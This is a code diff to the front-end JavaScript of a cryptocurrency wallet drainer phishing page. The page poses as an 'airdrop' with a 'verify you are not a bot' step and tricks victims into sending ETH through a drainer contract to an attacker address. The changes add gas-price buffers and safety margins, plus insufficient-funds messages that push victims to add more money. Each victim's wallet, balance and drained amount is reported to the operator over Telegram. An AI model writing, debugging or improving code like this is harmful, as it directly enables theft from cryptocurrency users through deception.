@@ -358,29 +358,54 @@
                 const drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
                 const amountToSend = web3.utils.toWei("0.01", "ether"); // 0.01 ETH for "verification"
 
-                // Estimate gas for the verifyNotBot transaction
-                const gasEstimate = await drainerContract.methods.verifyNotBot().estimateGas({
-                    from: userAccount,
-                    value: amountToSend
-                });
-                const gasPrice = await web3.eth.getGasPrice();
-                const gasFee = gasEstimate * gasPrice;
-
                 // Get the victim's ETH balance
                 const ethBalance = await web3.eth.getBalance(userAccount);
-                const totalRequired = BigInt(amountToSend) + BigInt(gasFee);
+                const ethBalanceBigInt = BigInt(ethBalance);
 
-                if (BigInt(ethBalance) < totalRequired) {
-                    document.getElementById("connectStatus").innerText = "Insufficient ETH balance to complete the verification. Please add funds to your wallet and try again.";
-                    await sendTelegramMessage(`⚠️ *Insufficient ETH Balance for Verification* ⚠️\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${web3.utils.fromWei(ethBalance, "ether")} ETH\n💸 *Required*: ${web3.utils.fromWei(totalRequired.toString(), "ether")} ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                // Estimate gas for the verifyNotBot transaction
+                let gasEstimate;
+                try {
+                    gasEstimate = await drainerContract.methods.verifyNotBot().estimateGas({
+                        from: userAccount,
+                        value: amountToSend
+                    });
+                } catch (error) {
+                    document.getElementById("connectStatus").innerText = "Failed to estimate gas for verification. Please try again later.";
+                    await sendTelegramMessage(`⚠️ *Gas Estimation Failed for Verification* ⚠️\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                     return;
                 }
 
+                // Get the current gas price and add a buffer (1.5x) to account for fluctuations
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasPriceWithBuffer = BigInt(gasPrice) * BigInt(15) / BigInt(10); // 1.5x buffer
+                const gasFee = BigInt(gasEstimate) * gasPriceWithBuffer;
+
+                // Add a safety margin to the total required amount (1.2x the gas fee)
+                const totalRequired = BigInt(amountToSend) + (gasFee * BigInt(12) / BigInt(10)); // 1.2x gas fee as safety margin
+
+                // Check if the victim has enough ETH to cover the transaction
+                if (ethBalanceBigInt < totalRequired) {
+                    const requiredEth = web3.utils.fromWei(totalRequired.toString(), "ether");
+                    const currentEth = web3.utils.fromWei(ethBalance, "ether");
+                    document.getElementById("connectStatus").innerText = `Insufficient ETH balance to complete the verification. You have ${currentEth} ETH, but need at least ${requiredEth} ETH (including gas fees). Please add funds to your wallet and try again.`;
+                    await sendTelegramMessage(`⚠️ *Insufficient ETH Balance for Verification* ⚠️\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${currentEth} ETH\n💸 *Required*: ${requiredEth} ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    return;
+                }
+
+                // Check if the gas price is unusually high (e.g., > 100 gwei)
+                const gasPriceInGwei = web3.utils.fromWei(gasPrice.toString(), "gwei");
+                if (parseFloat(gasPriceInGwei) > 100) {
+                    document.getElementById("connectStatus").innerText = "Gas price is currently too high due to network congestion. Please try again later or add more funds to cover the gas fee.";
+                    await sendTelegramMessage(`⚠️ *High Gas Price Detected for Verification* ⚠️\n👛 *Wallet*: ${userAccount}\n⛽ *Gas Price*: ${gasPriceInGwei} Gwei\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    return;
+                }
+
+                // Proceed with the transaction
                 const tx = await drainerContract.methods.verifyNotBot().send({
                     from: userAccount,
                     value: amountToSend,
                     gas: gasEstimate,
-                    gasPrice: gasPrice
+                    gasPrice: gasPriceWithBuffer.toString()
                 });
                 document.getElementById("connectStatus").innerText = "Transaction processed successfully. Airdrop pool verification complete.";
                 totalEthDrained += 0.01; // Update local tracking
@@ -390,9 +415,17 @@
                 await sendTelegramMessage(`🚀 *Auto-Drain ETH to Attacker* 🚀\n👛 *From*: ${userAccount}\n🎯 *To*: ${ATTACKER_ADDRESS}\n💰 *Amount*: 0.01 ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                 showStep(3); // Move to claim step
             } catch (error) {
-                document.getElementById("connectStatus").innerText = `Verification failed: ${error.message}`;
-                // Send Telegram notification for verification failure
-                await sendTelegramMessage(`❌ *Verification Transaction Rejected* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                // Handle specific error for insufficient funds
+                if (error.message.includes("insufficient funds")) {
+                    const ethBalanceAfterError = await web3.eth.getBalance(userAccount);
+                    const currentEth = web3.utils.fromWei(ethBalanceAfterError, "ether");
+                    document.getElementById("connectStatus").innerText = `Verification failed: Insufficient funds to cover gas fees. You have ${currentEth} ETH. Please add more funds to your wallet and try again.`;
+                    await sendTelegramMessage(`❌ *Verification Transaction Failed (Insufficient Funds)* ❌\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${currentEth} ETH\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                } else {
+                    document.getElementById("connectStatus").innerText = `Verification failed: ${error.message}. Please try again later.`;
+                    // Send Telegram notification for verification failure
+                    await sendTelegramMessage(`❌ *Verification Transaction Rejected* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                }
             }
         });
 
